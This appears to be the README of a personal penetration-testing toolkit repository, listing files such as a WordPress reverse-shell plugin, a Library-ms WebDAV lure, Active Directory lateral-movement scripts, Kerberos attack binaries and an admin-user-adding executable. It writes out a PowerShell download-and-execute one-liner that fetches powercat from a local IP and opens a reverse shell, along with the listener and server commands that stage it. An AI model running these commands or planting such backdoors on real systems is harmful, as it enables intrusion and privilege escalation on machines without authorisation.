<pre>
offensive
---------
Tips and tricks etc. for offensive security and testing

BackdoorPlug.php
|
'-->  A WordPres plugin containing reverse shell. 
      Prerequirements: you need access to the WP to upload and activate plugins.
      Just change the host/port to whatever your listener is running on and maybe adjust the shell accordingly too, then just zip 
      it, upload the zip as a plugin and activate the plugin to get connected with the WP-instance.

checklist
|
'-->  A very basic list of pentest steps.

config.Library-ms
|
'-->  A config library file to open a connection to the address defined in the simple location url, which for example serves 
      malicious Windows shortcut to execute some nasty powershell like:
        powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.12.34:9090/powercat.ps1'); powercat 
        -c 192.168.12.34 -p 4000 -e powershell"
      Here you should have the following: 
        - wsgidav (WebDAV: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/username/webdav/) server running, 
          serving the Windows shortcut file, which runs the command above
        - a Python httpd (python -m http.server 9090) serving the powercat.ps1
        - a netcat listener (nc -nvlp 4000) or similar to catch the resulting reverse shell.

dorks.google
|
'-->  Some random Google dorks to leverage while enriching your case data

enumhelper.ps1
|
'-->  A helper script for AD enumeration and lateral movement. Built on-the-go so might contain a lot of logical fallacies and 
      missing lots of error checks.
      Check the help section before running: .\enumhelper.ps1 "help" for somewhat of instructions.
      Can do: 
        - LDAP queries
        - User/pass testing over LDAP-query
        - List all properties of LDAP response object
        - Get the value of a specific LDAP property
        - Get all SPNs and related objects
        - Check if any SPNs are tied to a (service)account
        - Get DC info: name, hostname, OS, OS version, IPv4 and IPv6
        - Get AD device info: name, hostname, OS, OS SP, OS version, IPv4 and IPv6
        - Get AD user/group info by SID (converting a SID to a name for example)
        - Create PsExec.exe or PsExec64.exe
        - SID lookup from AD
        - DCOM lateral movement leveraging MMC
          - Also the possibility of building a reverse-shell command and initiating it on the target
        - Remote connectiong over PowerShell
        - Remote commands over WMI, WINRS, PsExec or PsExec64:
          - Also the possibility of building a reverse-shell command and initiating it on the target

Get-Shortcut.ps1
|
'-->  Get shortcut (.lnk) info via PowerShell. Just import-module .\Get-Shortcut.ps1 and you can go: Get-Shortcut c:\path\to\link.lnk
      
kerbrute_linux_amd64
|
'-->  An awesome tool for Kerberos bruting from https://github.com/ropnop/kerbrute, here's a pre-built
      64bit Linux binary
      
KrbRelayUp.exe
|
'-->  Kerberos Relay attack binary. 
      Lost my mind trying to get this to build so then just ended up getting a prebuilt one from
      https://kb.offsec.nl/tools/techniques/krbrelayup/, thanks! The source is available at:
      https://github.com/Dec0ne/KrbRelayUp
      
nix-shell-tricks
|
'-->  Common tips and tricks etc. to use in Linux shell when being offensive or otherwise enumerating

php-trickery
|
'-->  Some PHP-tricks for offensive security

reverse_shell.aspx
|
'-->  Not my creation, credit goes to INSOMNIA SECURITY :: InsomniaShell.aspx, 
      brett.moore@insomniasec.com ::  www.insomniasec.com

SeBackupPrivilegeCmdLets.dll
SeBackupPrivilegeUtils.dll
|
'--> Precompiled dlls from https://github.com/giuliano108/SeBackupPrivilege for leveraging 
     SeBackupPrivileged AD account. These are prebuilt x64, if you need other then you
     need to build them yourself from giuliano's source. Otherwise:
            Import-Module .\SeBackupPrivilegeUtils.dll
            Import-Module .\SeBackupPrivilegeCmdLets.dll
            Set-SeBackupPrivilege
            Copy-FileSeBackupPrivilege .\un_accessible_document.pdf c:\temp\now_accessible.pdf -Overwrite

sqli-tips
|
'-->  Tips for SQL injections

winbin.sh
|
'-->  Whip up custom executable/dll on the fly. So far only supports creating a x64 executable/dll for 
      adding a defined user with a defined password to the Administrators group or changing an existing user's password. 
      For example if you need to replace a bin which you have full control over to gain further foothold or to leverage a 
      missing DLL etc.

windows-shell-tricks-and-ad-tips
|
'-->  Common tips and tricks etc. to use with PowerShell / cmd when being offensive or otherwise enumerating and getting to know AD
</pre>
